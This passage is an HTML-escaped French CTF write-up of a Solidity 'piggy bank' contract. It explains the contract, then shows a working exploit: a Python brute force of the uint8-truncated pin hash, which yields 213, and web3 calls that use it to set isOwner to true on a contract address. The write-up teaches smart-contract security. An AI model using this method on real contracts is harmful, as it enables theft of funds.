&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;isOwner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;bytes32&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pinHash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ce dernier possède 4 champs:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;isOwner&lt;/code&gt;: boolean initialisé à &lt;code class=&quot;highlighter-rouge&quot;&gt;false&lt;/code&gt; qui est publique&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;funds&lt;/code&gt;: unsigned int de 256 bits (32 octets) qui est public&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pinHash&lt;/code&gt;: le hash d’un code pin ? qui est privé&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Le constructeur qui va initialiser le variable &lt;code class=&quot;highlighter-rouge&quot;&gt;funds&lt;/code&gt; à la quantité d’ether de la première transaction du propriétaire (&lt;code class=&quot;highlighter-rouge&quot;&gt;msg.value&lt;/code&gt;).&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La &lt;strong&gt;fallback function&lt;/strong&gt; qui met à jour la valeur de &lt;code class=&quot;highlighter-rouge&quot;&gt;funds&lt;/code&gt; en fonction de &lt;code class=&quot;highlighter-rouge&quot;&gt;msg.value&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unlockPiggyBank&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encodePacked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pinHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;isOwner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;    
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Fonction &lt;code class=&quot;highlighter-rouge&quot;&gt;unlockPiggyBank()&lt;/code&gt; qui prend en paramètre un &lt;code class=&quot;highlighter-rouge&quot;&gt;uint256&lt;/code&gt;, appellable seulement depuis l’extérieur (&lt;code class=&quot;highlighter-rouge&quot;&gt;external&lt;/code&gt;). Le champ &lt;code class=&quot;highlighter-rouge&quot;&gt;pinHash&lt;/code&gt; doit être égale au haché de notre input &lt;code class=&quot;highlighter-rouge&quot;&gt;pin&lt;/code&gt;pour rentrer dans le &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt;. Si c’est le cas, &lt;code class=&quot;highlighter-rouge&quot;&gt;isOwner&lt;/code&gt; passe à &lt;code class=&quot;highlighter-rouge&quot;&gt;true&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;a href=&quot;https://ethereum.stackexchange.com/questions/19380/external-vs-public-best-practices&quot;&gt;Ressource&lt;/a&gt;&lt;/p&gt;

  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;public&lt;/code&gt;: all can access&lt;/p&gt;

  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;external&lt;/code&gt;: cannot be accessed internally, only externally&lt;/p&gt;

  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;internal&lt;/code&gt;: only this contract and contracts deriving from it can access&lt;/p&gt;

  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;private&lt;/code&gt;: can be accessed only from this contract&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;withdrawPiggyBank&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;isOwner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transfer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;isOwner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Fonction &lt;code class=&quot;highlighter-rouge&quot;&gt;withdrawPiggyBank()&lt;/code&gt;, ne prend pas de paramètre, accessible seulement depuis l’extérieur. Cette fonction transfert les &lt;code class=&quot;highlighter-rouge&quot;&gt;funds&lt;/code&gt;à l’émetteur de la transaction (&lt;code class=&quot;highlighter-rouge&quot;&gt;msg.sender.transfer(funds);&lt;/code&gt;). Pour pouvoir exécuter cette fonction, il faut respecter le &lt;code class=&quot;highlighter-rouge&quot;&gt;require(isOwner == true)&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;attack-1&quot;&gt;Attack&lt;/h2&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unlockPiggyBank&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encodePacked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pinHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;isOwner&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;    
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On comprend rapidement que la fonction à attaquer est &lt;code class=&quot;highlighter-rouge&quot;&gt;unlockPiggyBank()&lt;/code&gt;. Il faut fournir la bonne valeur de &lt;code class=&quot;highlighter-rouge&quot;&gt;pin&lt;/code&gt;qui donne le haché &lt;code class=&quot;highlighter-rouge&quot;&gt;pinHash&lt;/code&gt;(ou &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c&lt;/code&gt;).&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;encodePacked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;uint8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;pinHash&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En lisant la condition, on peut voir que notre &lt;code class=&quot;highlighter-rouge&quot;&gt;pin&lt;/code&gt; de type &lt;code class=&quot;highlighter-rouge&quot;&gt;uint256&lt;/code&gt; est convertit en &lt;code class=&quot;highlighter-rouge&quot;&gt;uint8&lt;/code&gt; avant d’être haché. On passe alors d’une valeur de 256 bits à une valeur de 8 bits. Il n’y a alors que &lt;code class=&quot;highlighter-rouge&quot;&gt;2**8 = 256&lt;/code&gt; possibilités.&lt;/p&gt;

&lt;p&gt;On peut utiliser ce code python pour tester tous les hachés possibles sur 8 bits.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Crypto.Hash&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keccak&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pin&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keccak&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digest_bits&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'7d8db9357f1302f94064334778507bb7885244035ce76b16dc05318ba7bf624c'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] pin -&amp;gt; {pin}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# [+] pin -&amp;gt; 213
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La valeur 213 donne bien le bon haché !!&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[{&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;constant&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ABI&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;contractAddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0x288F068cdae9008944a03a3e7061650046734dC8&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// adresse d'instance&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;web3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;eth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;contractAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On créer notre “connexion” au smart contract.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;isOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La valeur de &lt;code class=&quot;highlighter-rouge&quot;&gt;isOwner&lt;/code&gt; est bien &lt;code class=&quot;highlighter-rouge&quot;&gt;false&lt;/code&gt;, et les fonds disponibles sont de &lt;code class=&quot;highlighter-rouge&quot;&gt;100&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// avant&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;isOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// mettre isOwner à true&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;unlockPiggyBank&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;213&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// après&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;contract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;isOwner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);});&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;--&amp;gt;&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;On commence par mettre &lt;code class=&quot;highlighter-rouge&quot;&gt;isOwner&lt;/code&gt; à &lt;code class=&quot;highlighter-rouge&quot;&gt;true&lt;/code&gt; en utilisant &lt;code class=&quot;highlighter-rouge&quot;&gt;unlockPiggyBank()&lt;/code&gt; avec &lt;code class=&quot;highlighter-rouge&quot;&gt;213&lt;/code&gt; comme paramètre.&lt;/p&gt;

